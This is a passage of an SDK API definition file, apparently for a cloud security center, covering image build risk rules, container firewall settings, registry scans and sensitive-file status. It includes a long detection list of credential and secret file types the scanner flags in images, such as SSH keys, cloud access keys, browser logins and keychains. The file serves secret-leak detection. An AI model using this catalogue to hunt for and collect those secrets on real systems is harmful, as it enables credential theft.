  }(name='Data', description='The data returned.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='BA674E4B-00CF-5DEA-8B92-360862FB5133'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model SetBuildRiskDefineRuleConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SetBuildRiskDefineRuleConfigResponseBody(name='body'),
}

/**
 * @summary Modifies configurations for scanning image build command risks.
 *
 * @param request SetBuildRiskDefineRuleConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SetBuildRiskDefineRuleConfigResponse
 */
async function setBuildRiskDefineRuleConfigWithOptions(request: SetBuildRiskDefineRuleConfigRequest, runtime: Util.RuntimeOptions): SetBuildRiskDefineRuleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SetBuildRiskDefineRuleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies configurations for scanning image build command risks.
 *
 * @param request SetBuildRiskDefineRuleConfigRequest
 * @return SetBuildRiskDefineRuleConfigResponse
 */
async function setBuildRiskDefineRuleConfig(request: SetBuildRiskDefineRuleConfigRequest): SetBuildRiskDefineRuleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return setBuildRiskDefineRuleConfigWithOptions(request, runtime);
}

model SetClusterInterceptionConfigRequest {
  clusterIds?: string(name='ClusterIds', description='The ID of the cluster. Separate multiple cluster IDs with commas (,).

> You can call the [ListClusterInterceptionConfig](~~ListClusterInterceptionConfig~~) operation to query the IDs of clusters.

This parameter is required.', example='c60b77fe62093480db6164a3c2fa****'),
  switchOn?: int32(name='SwitchOn', description='Specifies whether to turn on the switch. Valid values:

*   **1**: yes
*   **0**: no

This parameter is required.', example='1'),
  switchType?: int32(name='SwitchType', description='The type of the switch that you want to configure. Valid values:

*   **0**: the interception switch
*   **1**: the interception type switch
*   **2**: the interception history switch

This parameter is required.', example='0'),
}

model SetClusterInterceptionConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='74AB990C-539B-579B-9239-B8A2036B7337'),
  result?: boolean(name='Result', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model SetClusterInterceptionConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SetClusterInterceptionConfigResponseBody(name='body'),
}

/**
 * @summary Configures the status of the container firewall feature.
 *
 * @param request SetClusterInterceptionConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SetClusterInterceptionConfigResponse
 */
async function setClusterInterceptionConfigWithOptions(request: SetClusterInterceptionConfigRequest, runtime: Util.RuntimeOptions): SetClusterInterceptionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterIds)) {
    query['ClusterIds'] = request.clusterIds;
  }
  if (!Util.isUnset(request.switchOn)) {
    query['SwitchOn'] = request.switchOn;
  }
  if (!Util.isUnset(request.switchType)) {
    query['SwitchType'] = request.switchType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SetClusterInterceptionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Configures the status of the container firewall feature.
 *
 * @param request SetClusterInterceptionConfigRequest
 * @return SetClusterInterceptionConfigResponse
 */
async function setClusterInterceptionConfig(request: SetClusterInterceptionConfigRequest): SetClusterInterceptionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return setClusterInterceptionConfigWithOptions(request, runtime);
}

model SetImageBuildRiskStatusRequest {
  imageUuids?: string(name='ImageUuids', description='The UUIDs of images. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query the UUIDs of images.', example='f382fccd88b94c5c8c864def681*****,ac32fccd88b94c5c8c864def681*****'),
  riskKey?: string(name='RiskKey', description='The keyword of the image build command risk.', example='risk.type'),
  status?: int32(name='Status', description='The status of the image build command risk. Valid values:

*   **0**: unhandled.
*   **1**: ignored.
*   **2**: false positive.', example='0'),
}

model SetImageBuildRiskStatusResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    id?: long(name='Id', description='The ID of the rule.', example='273698***'),
  }(name='Data', description='The data returned.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='52870893-48A7-5A9E-9E05-6253E5B6****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model SetImageBuildRiskStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SetImageBuildRiskStatusResponseBody(name='body'),
}

/**
 * @summary Specifies the status of an image build command risk.
 *
 * @param request SetImageBuildRiskStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SetImageBuildRiskStatusResponse
 */
async function setImageBuildRiskStatusWithOptions(request: SetImageBuildRiskStatusRequest, runtime: Util.RuntimeOptions): SetImageBuildRiskStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.imageUuids)) {
    query['ImageUuids'] = request.imageUuids;
  }
  if (!Util.isUnset(request.riskKey)) {
    query['RiskKey'] = request.riskKey;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SetImageBuildRiskStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Specifies the status of an image build command risk.
 *
 * @param request SetImageBuildRiskStatusRequest
 * @return SetImageBuildRiskStatusResponse
 */
async function setImageBuildRiskStatus(request: SetImageBuildRiskStatusRequest): SetImageBuildRiskStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return setImageBuildRiskStatusWithOptions(request, runtime);
}

model SetImageSensitiveFileStatusRequest {
  idList?: [ long ](name='IdList', description='The IDs of the sensitive files.'),
  imageUuids?: string(name='ImageUuids', description='The UUID of the image. Separate multiple UUIDs with commas (,).', example='f382fccd88b94c5c8c864def6815b854,ac32fccd88b94c5c8c864def6815bo9z'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that are scanned.'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The alert type of the sensitive file. Valid values:

*   **npm_token**: Node Package Manager (NPM) access token.
*   **ftp_cfg**: FTP configuration.
*   **google_oauth_key**: Google OAuth key.
*   **planetscale_passwd**: PlanetScale password.
*   **github_ssh_key**: Github SSH key.
*   **msbuild_publish_profile**: MSBuild publish profile.
*   **fastly_cdn_token**: Fastly CDN token.
*   **ssh_private_key**: SSH private key.
*   **aws_cli**: Amazon Web Services (AWS) CLI credential.
*   **cpanel_proftpd**: cPanel ProFTPD credential.
*   **postgresql_passwd**: PostgreSQL password file.
*   **discord_client_cred**: Discord client credential.
*   **rails_database**: Rails database configuration.
*   **aws_access_key**: AWS access key.
*   **esmtp_cfg**: Extended Simple Mail Transfer Protocol (ESMTP) configuration.
*   **docker_registry_cfg**: configuration of a Docker image repository.
*   **pem**: Privacy-Enhanced Mail (PEM).
*   **common_cred**: common credential.
*   **sftp_cfg**: Secure File Transfer Protocol (SFTP) connection configuration.
*   **grafana_token**: Grafana token.
*   **slack_token**: Slack token.
*   **ec_private_key**: Elliptic Curve (EC) private key.
*   **pypi_token**: upload token for the Python Package Index (PyPI).
*   **finicity_token**: Finicity token.
*   **k8s_client_key**: private key for the Kubernetes client.
*   **git_cfg**: Git configuration.
*   **django_key**: Django key.
*   **jenkins_ssh**: Jenkins SSH configuration file.
*   **openssh_private_key**: OpenSSL private key.
*   **square_oauth**: OAuth credential for Square.
*   **typeform_token**: Typeform token.
*   **common_database_cfg**: general database connection configuration.
*   **wordpress_database_cfg**: WordPress database configuration.
*   **googlecloud_api_key**: API key for Google Cloud.
*   **vscode_sftp**: VSCode SFTP configuration.
*   **apache_htpasswd**: Apache htpasswd.
*   **planetscale_token**: PlanetScale token.
*   **contentful_preview_token**: preview token for Contentful.
*   **php_database_cfg**: database password for a PHP application.
*   **atom_remote_sync**: Atom remote synchronization configuration.
*   **aws_session_token**: AWS session token.
*   **atom_sftp_cfg**: Atom SFTP configuration.
*   **asana_client_private_key**: private key for the Asana client.
*   **tencentcloud_ak**: secret ID of a third-party cloud.
*   **rsa_private_key**: Rivest-Shamir-Adleman (RSA) private key.
*   **github_personal_token**: personal access token for GitHub.
*   **pgp**: Pretty Good Privacy (PGP) encrypted file.
*   **stripe_skpk**: Stripe secret key.
*   **square_token**: Square access token.
*   **rails_carrierwave**: file upload credential for Rails Carrierwave.
*   **dbeaver_database_cfg**: DBeaver database configuration.
*   **robomongo_cred**: RoboMongo credential.
*   **github_oauth_token**: OAuth access token for GitHub.
*   **pulumi_token**: Pulumi token.
*   **ventrilo_voip**: Ventrilo VoIP server configuration.
*   **macos_keychain**: macOS keychain.
*   **amazon_mws_token**: Amazon MWS token.
*   **dynatrace_token**: Dynatrace token.
*   **java_keystore**: Java KeyStore (JKS).
*   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database.
*   **kubernetes_dashboard_cred**: user credential for Kubernetes Dashboard.
*   **atlassian_token**: Atlassian token.
*   **rdp**: remote desktop protocol (RDP).
*   **mailgun_key**: Mailgun webhook signing key.
*   **mailchimp_api_key**: API key for Mailchimp.
*   **netrc_cfg**: .netrc configuration file.
*   **openvpn_cfg**: configuration of the OpenVPN client.
*   **github_refresh_token**: GitHub refresh token.
*   **salesforce**: Salesforce credential.
*   **salesforce**: Sendinblue token.
*   **pkcs_private_key**: PKCS#12 key.
*   **rubyonrails_passwd**: Ruby on Rails password file.
*   **filezilla_ftp**: FileZilla FTP configuration.
*   **databricks_token**: Databricks token.
*   **gitLab_personal_toke**: personal access token for GitLab.
*   **rails_master_key**: Rails master key.
*   **sqlite**: SQLite3 or SQLite database.
*   **firefox_logins**: Firefox logon configuration.
*   **mailgun_private_token**: Mailgun private token.
*   **joomla_cfg**: Joomla configuration.
*   **hashicorp_terraform_token**: HashiCorp Terraform token.
*   **jetbrains_ides**: JetBrains IDEs configuration.
*   **heroku_api_key**: Heroku API key.
*   **messagebird_token**: MessageBird token.
*   **github_app_token**: Github app token.
*   **hashicorp_vault_token**: HashiCorp Vault token.
*   **pgp_private_key**: PGP private key.
*   **sshpasswd**: SSH password.
*   **huaweicloud_ak**: secret access key of a third-party cloud.
*   **aws_s3cmd**: AWS S3cmd configuration.
*   **php_config**: PHP configuration.
*   **common_private_key**: common private key.
*   **microsoft_mdf**: Microsoft SQL Server database.
*   **mediawiki_cfg**: MediaWiki configuration.
*   **jenkins_cred**: Jenkins credential.
*   **rubygems_cred**: RubyGems credential.
*   **clojars_token**: Clojars token.
*   **phoenix_web_passwd**: Phoenix web credential.
*   **puttygen_private_key**: PuTTYgen private key.
*   **google_oauth_token**: Google OAuth access token.
*   **rubyonrails_cfg**: Ruby On Rails database configuration.
*   **lob_api_key**: Lob API key.
*   **pkcs_cred**: PKCS#12 certificate.
*   **otr_private_key**: Off-the-Record Messaging (OTR) private key.
*   **contentful_delivery_token**: Contentful delivery token.
*   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration.
*   **dsa_private_key**: Digital Signature Algorithm (DSA) private key.
*   **rails_app_token**: Rails app token.
*   **git_cred**: Git user credential.
*   **newrelic_api_key**: User API key for New Relic.
*   **github_hub**: hub configuration for storing GitHub tokens.
*   **rubygem**: RubyGem token.', example='pem'),
  status?: int32(name='Status', description='The status of the sensitive file. Valid values:

*   **0**: The sensitive file is not handled.
*   **1**: The sensitive file is added to a whitelist.
*   **2**: The sensitive file is reported by mistake.', example='0'),
}

model SetImageSensitiveFileStatusShrinkRequest {
  idList?: [ long ](name='IdList', description='The IDs of the sensitive files.'),
  imageUuids?: string(name='ImageUuids', description='The UUID of the image. Separate multiple UUIDs with commas (,).', example='f382fccd88b94c5c8c864def6815b854,ac32fccd88b94c5c8c864def6815bo9z'),
  scanRangeShrink?: string(name='ScanRange', description='The types of the assets that are scanned.'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The alert type of the sensitive file. Valid values:

*   **npm_token**: Node Package Manager (NPM) access token.
*   **ftp_cfg**: FTP configuration.
*   **google_oauth_key**: Google OAuth key.
*   **planetscale_passwd**: PlanetScale password.
*   **github_ssh_key**: Github SSH key.
*   **msbuild_publish_profile**: MSBuild publish profile.
*   **fastly_cdn_token**: Fastly CDN token.
*   **ssh_private_key**: SSH private key.
*   **aws_cli**: Amazon Web Services (AWS) CLI credential.
*   **cpanel_proftpd**: cPanel ProFTPD credential.
*   **postgresql_passwd**: PostgreSQL password file.
*   **discord_client_cred**: Discord client credential.
*   **rails_database**: Rails database configuration.
*   **aws_access_key**: AWS access key.
*   **esmtp_cfg**: Extended Simple Mail Transfer Protocol (ESMTP) configuration.
*   **docker_registry_cfg**: configuration of a Docker image repository.
*   **pem**: Privacy-Enhanced Mail (PEM).
*   **common_cred**: common credential.
*   **sftp_cfg**: Secure File Transfer Protocol (SFTP) connection configuration.
*   **grafana_token**: Grafana token.
*   **slack_token**: Slack token.
*   **ec_private_key**: Elliptic Curve (EC) private key.
*   **pypi_token**: upload token for the Python Package Index (PyPI).
*   **finicity_token**: Finicity token.
*   **k8s_client_key**: private key for the Kubernetes client.
*   **git_cfg**: Git configuration.
*   **django_key**: Django key.
*   **jenkins_ssh**: Jenkins SSH configuration file.
*   **openssh_private_key**: OpenSSL private key.
*   **square_oauth**: OAuth credential for Square.
*   **typeform_token**: Typeform token.
*   **common_database_cfg**: general database connection configuration.
*   **wordpress_database_cfg**: WordPress database configuration.
*   **googlecloud_api_key**: API key for Google Cloud.
*   **vscode_sftp**: VSCode SFTP configuration.
*   **apache_htpasswd**: Apache htpasswd.
*   **planetscale_token**: PlanetScale token.
*   **contentful_preview_token**: preview token for Contentful.
*   **php_database_cfg**: database password for a PHP application.
*   **atom_remote_sync**: Atom remote synchronization configuration.
*   **aws_session_token**: AWS session token.
*   **atom_sftp_cfg**: Atom SFTP configuration.
*   **asana_client_private_key**: private key for the Asana client.
*   **tencentcloud_ak**: secret ID of a third-party cloud.
*   **rsa_private_key**: Rivest-Shamir-Adleman (RSA) private key.
*   **github_personal_token**: personal access token for GitHub.
*   **pgp**: Pretty Good Privacy (PGP) encrypted file.
*   **stripe_skpk**: Stripe secret key.
*   **square_token**: Square access token.
*   **rails_carrierwave**: file upload credential for Rails Carrierwave.
*   **dbeaver_database_cfg**: DBeaver database configuration.
*   **robomongo_cred**: RoboMongo credential.
*   **github_oauth_token**: OAuth access token for GitHub.
*   **pulumi_token**: Pulumi token.
*   **ventrilo_voip**: Ventrilo VoIP server configuration.
*   **macos_keychain**: macOS keychain.
*   **amazon_mws_token**: Amazon MWS token.
*   **dynatrace_token**: Dynatrace token.
*   **java_keystore**: Java KeyStore (JKS).
*   **microsoft_sdf**: Microsoft SQL Server Compact Edition (CE) database.
*   **kubernetes_dashboard_cred**: user credential for Kubernetes Dashboard.
*   **atlassian_token**: Atlassian token.
*   **rdp**: remote desktop protocol (RDP).
*   **mailgun_key**: Mailgun webhook signing key.
*   **mailchimp_api_key**: API key for Mailchimp.
*   **netrc_cfg**: .netrc configuration file.
*   **openvpn_cfg**: configuration of the OpenVPN client.
*   **github_refresh_token**: GitHub refresh token.
*   **salesforce**: Salesforce credential.
*   **salesforce**: Sendinblue token.
*   **pkcs_private_key**: PKCS#12 key.
*   **rubyonrails_passwd**: Ruby on Rails password file.
*   **filezilla_ftp**: FileZilla FTP configuration.
*   **databricks_token**: Databricks token.
*   **gitLab_personal_toke**: personal access token for GitLab.
*   **rails_master_key**: Rails master key.
*   **sqlite**: SQLite3 or SQLite database.
*   **firefox_logins**: Firefox logon configuration.
*   **mailgun_private_token**: Mailgun private token.
*   **joomla_cfg**: Joomla configuration.
*   **hashicorp_terraform_token**: HashiCorp Terraform token.
*   **jetbrains_ides**: JetBrains IDEs configuration.
*   **heroku_api_key**: Heroku API key.
*   **messagebird_token**: MessageBird token.
*   **github_app_token**: Github app token.
*   **hashicorp_vault_token**: HashiCorp Vault token.
*   **pgp_private_key**: PGP private key.
*   **sshpasswd**: SSH password.
*   **huaweicloud_ak**: secret access key of a third-party cloud.
*   **aws_s3cmd**: AWS S3cmd configuration.
*   **php_config**: PHP configuration.
*   **common_private_key**: common private key.
*   **microsoft_mdf**: Microsoft SQL Server database.
*   **mediawiki_cfg**: MediaWiki configuration.
*   **jenkins_cred**: Jenkins credential.
*   **rubygems_cred**: RubyGems credential.
*   **clojars_token**: Clojars token.
*   **phoenix_web_passwd**: Phoenix web credential.
*   **puttygen_private_key**: PuTTYgen private key.
*   **google_oauth_token**: Google OAuth access token.
*   **rubyonrails_cfg**: Ruby On Rails database configuration.
*   **lob_api_key**: Lob API key.
*   **pkcs_cred**: PKCS#12 certificate.
*   **otr_private_key**: Off-the-Record Messaging (OTR) private key.
*   **contentful_delivery_token**: Contentful delivery token.
*   **digital_ocean_tugboat**: DigitalOcean Tugboat configuration.
*   **dsa_private_key**: Digital Signature Algorithm (DSA) private key.
*   **rails_app_token**: Rails app token.
*   **git_cred**: Git user credential.
*   **newrelic_api_key**: User API key for New Relic.
*   **github_hub**: hub configuration for storing GitHub tokens.
*   **rubygem**: RubyGem token.', example='pem'),
  status?: int32(name='Status', description='The status of the sensitive file. Valid values:

*   **0**: The sensitive file is not handled.
*   **1**: The sensitive file is added to a whitelist.
*   **2**: The sensitive file is reported by mistake.', example='0'),
}

model SetImageSensitiveFileStatusResponseBody = {
  code?: string(name='Code', description='The HTTP status code.', example='200'),
  data?: {
    id?: long(name='Id', description='The primary key ID of the database.', example='18551'),
  }(name='Data', description='The returned data.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='20456DD5-5CBF-5015-9173-12CA4246****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model SetImageSensitiveFileStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SetImageSensitiveFileStatusResponseBody(name='body'),
}

/**
 * @summary Modifies the status of sensitive files in an image.
 *
 * @param tmpReq SetImageSensitiveFileStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SetImageSensitiveFileStatusResponse
 */
async function setImageSensitiveFileStatusWithOptions(tmpReq: SetImageSensitiveFileStatusRequest, runtime: Util.RuntimeOptions): SetImageSensitiveFileStatusResponse {
  Util.validateModel(tmpReq);
  var request = new SetImageSensitiveFileStatusShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.idList)) {
    query['IdList'] = request.idList;
  }
  if (!Util.isUnset(request.imageUuids)) {
    query['ImageUuids'] = request.imageUuids;
  }
  if (!Util.isUnset(request.scanRangeShrink)) {
    query['ScanRange'] = request.scanRangeShrink;
  }
  if (!Util.isUnset(request.sensitiveFileKey)) {
    query['SensitiveFileKey'] = request.sensitiveFileKey;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SetImageSensitiveFileStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the status of sensitive files in an image.
 *
 * @param request SetImageSensitiveFileStatusRequest
 * @return SetImageSensitiveFileStatusResponse
 */
async function setImageSensitiveFileStatus(request: SetImageSensitiveFileStatusRequest): SetImageSensitiveFileStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return setImageSensitiveFileStatusWithOptions(request, runtime);
}

model SetRegistryScanDayNumRequest {
  scanDayNum?: int32(name='ScanDayNum', description='The cycle at which you want to scan your images. Unit: days.

This parameter is required.', example='1'),
}

model SetRegistryScanDayNumResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48483161-F328-5A12-AB78-3EB81F37****'),
}

model SetRegistryScanDayNumResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SetRegistryScanDayNumResponseBody(name='body'),
}

/**
 * @summary Specifies a cycle to scan images for image repositories. Unit: days.
 *
 * @param request SetRegistryScanDayNumRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SetRegistryScanDayNumResponse
 */
async function setRegistryScanDayNumWithOptions(request: SetRegistryScanDayNumRequest, runtime: Util.RuntimeOptions): SetRegistryScanDayNumResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.scanDayNum)) {
    query['ScanDayNum'] = request.scanDayNum;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SetRegistryScanDayNum',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Specifies a cycle to scan images for image repositories. Unit: days.
 *
 * @param request SetRegistryScanDayNumRequest
 * @return SetRegistryScanDayNumResponse
 */
async function setRegistryScanDayNum(request: SetRegistryScanDayNumRequest): SetRegistryScanDayNumResponse {
  var runtime = new Util.RuntimeOptions{};
  return setRegistryScanDayNumWithOptions(request, runtime);
}

model SetSensitiveDefineRuleConfigRequest {
  config?: string(name='Config', description='The configurations of the custom check rule. The value is in the JSON format. Valid values of keys:

*   **classKey**: the category keyword of the check rule.
*   **ruleList**: the keyword of the check rule.', example='[{\\\\"classKey\\\\": \\\\"password\\\\", \\\\"ruleList\\\\": [\\\\"huaweicloud_ak\\\\", \\\\"ak_leak\\\\"]}]'),
  enableNewRule?: int32(name='EnableNewRule', description='Specifies whether to enable the new ruled for automatic check only on agentless detection. Valid values:

*   **0**: no.
*   **1**: yes.', example='1'),
  source?: string(name='Source', description='The source of the check rules. Valid values:

*   **image**: image.
*   **agentless**: agentless detection.', example='agentless'),
}

model SetSensitiveDefineRuleConfigResponseBody = {
  code?: string(name='Code', description='The HTTP status code.', example='200'),
  data?: {
    id?: long(name='Id', description='The custom primary key.', example='44616'),
  }(name='Data', description='The returned data.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model SetSensitiveDefineRuleConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SetSensitiveDefineRuleConfigResponseBody(name='body'),
}

/**
 * @summary Configure the check rules of sensitive files.
 *
 * @param request SetSensitiveDefineRuleConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SetSensitiveDefineRuleConfigResponse
 */
async function setSensitiveDefineRuleConfigWithOptions(request: SetSensitiveDefineRuleConfigRequest, runtime: Util.RuntimeOptions): SetSensitiveDefineRuleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.enableNewRule)) {
    query['EnableNewRule'] = request.enableNewRule;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SetSensitiveDefineRuleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Configure the check rules of sensitive files.
 *
 * @param request SetSensitiveDefineRuleConfigRequest
 * @return SetSensitiveDefineRuleConfigResponse
 */
async function setSensitiveDefineRuleConfig(request: SetSensitiveDefineRuleConfigRequest): SetSensitiveDefineRuleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return setSensitiveDefineRuleConfigWithOptions(request, runtime);
}

model SetSyncRefreshRegionRequest {
  defaultRegion?: int32(name='DefaultRegion', description='The access type of the multi-cloud site. Valid values:

*   **0**: The current site is not the default site of multi-cloud site. You can specify the current site as the default site of the multi-cloud site.
*   **1**: The current site is the default site of multi-cloud site.', example='0'),
  regionIds?: [ string ](name='RegionIds', description='The regions from which you want to synchronize assets at the current site.'),
  vendor?: string(name='Vendor', description='The cloud service provider. Valid values:

*   **Tencent**: Tencent Cloud
*   **HUAWEICLOUD**: Huawei Cloud
*   **Azure**: Microsoft Azure
*   **AWS**: Amazon Web Services (AWS)', example='Tencent'),
}

model SetSyncRefreshRegionResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='9BB78BC9-07B9-578B-B020-C954E6FC****'),
}

model SetSyncRefreshRegionResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: SetSyncRefreshRegionResponseBody(name='body'),
}

/**
 * @summary Configures the regions from which you want to synchronize assets.
 *
 * @param request SetSyncRefreshRegionRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return SetSyncRefreshRegionResponse
 */
async function setSyncRefreshRegionWithOptions(request: SetSyncRefreshRegionRequest, runtime: Util.RuntimeOptions): SetSyncRefreshRegionResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defaultRegion)) {
    query['DefaultRegion'] = request.defaultRegion;
  }
  if (!Util.isUnset(request.regionIds)) {
    query['RegionIds'] = request.regionIds;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'SetSyncRefreshRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Configures the regions from which you want to synchronize assets.
 *
 * @param request SetSyncRefreshRegionRequest
 * @return SetSyncRefreshRegionResponse
 */
async function setSyncRefreshRegion(request: SetSyncRefreshRegionRequest): SetSyncRefreshRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return setSyncRefreshRegionWithOptions(request, runtime);
}

model StartBaselineSecurityCheckRequest {
  itemIds?: [ long ](name='ItemIds', description='The IDs of the check items.

> To perform a check task on cloud service configurations, you must specify the ID of the check item. You can call the [DescribeRiskItemType](~~DescribeRiskItemType~~) operation to query the IDs of check items.'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='106.11.XX.XX'),
  type?: string(name='Type', description='The type of the check task. Valid values:

*   **check**
*   **verify**

This parameter is required.', example='verify'),
}

model StartBaselineSecurityCheckResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='48D2E9A9-A1B0-4295-B727-0995757C47E9'),
}

model StartBaselineSecurityCheckResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: StartBaselineSecurityCheckResponseBody(name='body'),
}

/**
 * @deprecated OpenAPI StartBaselineSecurityCheck is deprecated, please use Sas::2018-12-03::SubmitCheck instead.
 *
